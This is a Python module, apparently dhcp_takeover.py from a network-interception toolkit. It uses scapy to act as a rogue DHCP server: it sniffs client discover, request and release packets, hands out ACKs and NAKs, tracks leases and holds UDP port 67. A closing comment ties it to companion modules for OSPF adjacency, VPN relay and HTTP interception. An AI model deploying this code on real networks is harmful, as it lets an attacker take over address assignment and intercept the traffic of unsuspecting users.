    if requested_ip is not None and requested_ip != offered_ip:
        print_step("FAIL", f"Sending DHCPNAK: client requested {requested_ip} but we proposed {offered_ip}")
        nak_packet = build_dhcp_nak(packet, server_ip, server_mac, vlan_id)
        log_built_dhcp_response("DHCPNAK", nak_packet)
        sendp(nak_packet, iface=server_details["interface"], verbose=False)
        return None

    ack_packet = build_dhcp_response(
        packet,
        "ack",
        offered_ip,
        dhcp_network,
        server_ip,
        server_mac,
        server_details=server_details,
    )
    log_built_dhcp_response("DHCPACK", ack_packet)
    if dhcp_network["mode"] == "relay":
        print_step("START", f"Sending DHCPACK {offered_ip} to relay {dhcp_network['giaddr']}")
    else:
        print_step("START", f"Sending DHCPACK {offered_ip} directly to client")
    sendp(ack_packet, iface=server_details["interface"], verbose=False)
    print_step("OK", f"Sent DHCPACK {offered_ip}")

    dhcp_network["proposed_addresses"].discard(offered_ip)
    dhcp_network["leased_addresses"].add(offered_ip)
    proposed_leases.pop(lease_key, None)
    answered_xids.add(bootp.xid)
    print_step("OK", f"Recorded DHCP lease {offered_ip}")
    return offered_ip


def handle_dhcp_release(packet, networks, server_details):
    """Free a released IP back to its network's lease pool."""
    if not packet.haslayer(BOOTP):
        return None

    client_mac = get_bootp_client_mac(packet)
    released_ip = packet[BOOTP].ciaddr
    if not released_ip or released_ip == "0.0.0.0":
        return None

    released_ip = str(released_ip)
    for dhcp_network in networks:
        if released_ip in dhcp_network["leased_addresses"]:
            dhcp_network["leased_addresses"].discard(released_ip)
            dhcp_network["proposed_addresses"].discard(released_ip)
            print_step("OK", f"Released {released_ip} from {client_mac} on {dhcp_network['network']}")
            return released_ip

    print_step("SKIP", f"DHCPRELEASE for {released_ip} from {client_mac}: address not in any lease pool")
    return None


def handle_dhcp_client_packet(packet, networks, proposed_leases, server_details):
    """Dispatch DHCPDISCOVER, DHCPREQUEST, and DHCPRELEASE; return a result dict or None."""
    message_type = get_dhcp_message_type(packet)
    if (
        server_details.get("relay_only")
        and packet[BOOTP].giaddr == "0.0.0.0"
        and message_type not in DHCP_REQUEST_TYPES
        and message_type not in DHCP_RELEASE_TYPES
    ):
        print_step("SKIP", "Ignoring direct DHCP packet in routed-helper workflow")
        return None

    if message_type in DHCP_DISCOVER_TYPES:
        offered_ip = offer_address_to_discover(packet, networks, proposed_leases, server_details)
        if offered_ip:
            bootp = packet[BOOTP]
            return {
                "message_type": "discover",
                "action": "offer",
                "ip_address": offered_ip,
                "xid": bootp.xid,
                "giaddr": bootp.giaddr,
            }

    if message_type in DHCP_REQUEST_TYPES:
        leased_ip = ack_request(packet, networks, proposed_leases, server_details)
        if leased_ip:
            bootp = packet[BOOTP]
            return {
                "message_type": "request",
                "action": "ack",
                "ip_address": leased_ip,
                "xid": bootp.xid,
                "giaddr": bootp.giaddr,
            }

    if message_type in DHCP_RELEASE_TYPES:
        released_ip = handle_dhcp_release(packet, networks, server_details)
        if released_ip:
            bootp = packet[BOOTP]
            return {
                "message_type": "release",
                "action": "release",
                "ip_address": released_ip,
                "xid": bootp.xid,
                "giaddr": bootp.giaddr,
            }

    return None


def bind_dhcp_udp_guard(address="0.0.0.0"):
    guard_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    guard_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        guard_socket.bind((address, 67))
    except OSError:
        guard_socket.close()
        raise
    print_step("OK", f"Bound UDP/67 guard socket on {address}")
    return guard_socket


def sniff_for_dhcp_discover_and_request(networks, proposed_leases, server_details, timeout=None, count=0):
    handled_events = []

    def handle_packet(packet):
        result = handle_dhcp_client_packet(packet, networks, proposed_leases, server_details)
        if result:
            handled_events.append(result)
            print_step("OK", f"Handled DHCP {result['message_type']} with {result['action']} {result['ip_address']}")

    print_step("START", f"Sniffing DHCPDISCOVER/DHCPREQUEST/DHCPRELEASE packets on {server_details['interface']}")
    guard_socket = bind_dhcp_udp_guard()
    try:
        sniff(
            iface=server_details["interface"],
            filter=DHCP_SNIFF_FILTER,
            lfilter=lambda packet: packet.haslayer(DHCP) and packet.haslayer(BOOTP),
            prn=handle_packet,
            store=False,
            timeout=timeout,
            count=count,
        )
    finally:
        guard_socket.close()
    print_step("OK", f"Finished DHCP client sniff loop with {len(handled_events)} handled event(s)")
    return handled_events



# This module is a library — the orchestration that used to live in main() now
# lives in main.py, which wires dhcp_takeover, ospf_adjacency, vpn_relay, and
# http_intercept together.
if __name__ == "__main__":
    print_step(
        "FAIL",
        "dhcp_takeover.py is a library module. Run the toolkit via:  sudo python3 main.py",
    )
